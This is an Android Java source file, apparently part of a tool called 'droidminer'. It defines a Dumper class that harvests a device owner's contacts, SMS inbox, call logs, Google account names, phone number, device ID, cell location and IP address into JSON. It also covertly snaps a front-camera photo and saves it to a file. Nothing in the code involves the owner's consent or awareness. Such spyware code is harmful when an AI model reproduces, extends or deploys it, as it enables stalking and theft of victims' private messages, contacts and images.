package com.miner.droidminer.modules;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.FileOutputStream;
import java.util.Date;

/**
 * Created by Kopites on 10/18/2016.
 */

public class Dumper {
    private static final String DUMP_ERROR = "DUMP_ERROR";

    public JSONArray dumpContacts(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts._ID)
                    );
                    String name = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                    );
                    if (cursor.getInt(cursor.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCusor = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id},
                                null
                        );
                        while (pCusor.moveToNext()) {
                            String phoneNo = pCusor.getString(pCusor.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                            ));
                            try {
                                jsonArray.put(new JSONObject().put("name", name).put("num", phoneNo));
                            } catch (Exception e) {
                                Log.e(DUMP_ERROR, e.getMessage());
                            }
                        }
                        pCusor.close();
                    }
                }
            }
            cursor.close();
            return jsonArray;
        } catch (Exception e) {
            Log.e(DUMP_ERROR, e.getMessage());
        }
        return null;
    }

    public JSONArray dumpSMS(Context context) {
        try {
            Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            JSONArray jsonObject = new JSONArray();
            cursor.moveToFirst();
            while (cursor.moveToNext()) {
                String body = cursor.getString(cursor.getColumnIndex("body"));
                String address = cursor.getString(cursor.getColumnIndex("address"));
                try {
                    jsonObject.put(new JSONObject().put("body", body).put("address", address));
                } catch (JSONException e) {
                    return null;
                }
            }
            cursor.close();
            Log.d("SMS JSON List", jsonObject.toString());
            return jsonObject;
        } catch (Exception e) {
            Log.e(DUMP_ERROR, e.getMessage());
        }
        return null;
    }

    public JSONObject dumpInfo(Context context) {
        JSONObject properties = new JSONObject();
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        WifiManager wm = (WifiManager) context.getSystemService(context.WIFI_SERVICE);
        String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
        try {
            properties.put("phone_number", telephonyManager.getLine1Number());
            properties.put("phone_id", telephonyManager.getDeviceId());
            properties.put("mobile_operator", telephonyManager.getNetworkOperatorName());
            properties.put("phone_location", telephonyManager.getCellLocation());
            properties.put("phone_country", telephonyManager.getSimCountryIso());
            properties.put("phone_ip", ip);
            properties.put("device_model", Build.MODEL);
            properties.put("android_version", Build.VERSION.RELEASE);
        } catch (Exception e) {
            Log.e(DUMP_ERROR, e.getMessage());
        }
        return properties;
    }

    public void dumpFace(Context context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED) {
            Log.d("Front Camera ID", String.valueOf(Util.getFrontCamera()));
            try {
                Camera camera = Camera.open(Util.getFrontCamera());
                camera.takePicture(null, null, this.cameraDump());

                camera.release();
            } catch (Exception e) {
                Log.e(DUMP_ERROR, e.getMessage());
            }
        }
    }

    public Camera.PictureCallback cameraDump() {
        Camera.PictureCallback pictureCallback = new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] bytes, Camera camera) {
                try {
                    FileOutputStream fileOutputStream = new FileOutputStream(Constants.FACE_PATH);
                    fileOutputStream.write(bytes);
                    fileOutputStream.close();
                } catch (Exception e) {
                    Log.e(DUMP_ERROR, e.getMessage());
                }
            }
        };
        return pictureCallback;
    }

    /********************************************************************/
    public JSONObject getAccount(Context context) {
        JSONObject jsonObject = new JSONObject();
        AccountManager accManager = AccountManager.get(context.getApplicationContext());
        Account acc[] = accManager.getAccountsByType("com.google");
        int accCount = acc.length;

        for (int i = 0; i < accCount; i++) {
            try {
                jsonObject.put("account_info", acc[i].name);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        return jsonObject;
    }

    /**********************************************************************/
    public JSONObject getCurrentActivity(Context context) {
        JSONObject curActivity = new JSONObject();
        return curActivity;
    }

    /***********************************************************************/
    public JSONArray getCallLogs(Context context) {
        JSONArray callLogs = new JSONArray();
        //StringBuffer sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
 /* Query the CallLog Content Provider */
        Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
                null, null, strOrder);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        while (managedCursor.moveToNext()) {
            String phNum = managedCursor.getString(number);
            String callTypeCode = managedCursor.getString(type);
            String strcallDate = managedCursor.getString(date);
            Date callDate = new Date(Long.valueOf(strcallDate));
            String callDuration = managedCursor.getString(duration);
            String callType = null;
            int callcode = Integer.parseInt(callTypeCode);
            switch (callcode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callType = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callType = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callType = "Missed";
                    break;
            }
            try {
                callLogs.put(
                        new JSONObject().put("call_number", phNum)
                                        .put("call_type", callType)
                                        .put("call_date", callDate)
                                        .put("call_dur", callDuration));
            } catch (JSONException e) {
                Log.e("CallLogs Error", e.getMessage());
            }
        }
        managedCursor.close();

        return callLogs;
    }

    /***************************** LOCATION INFO ****************************/
}
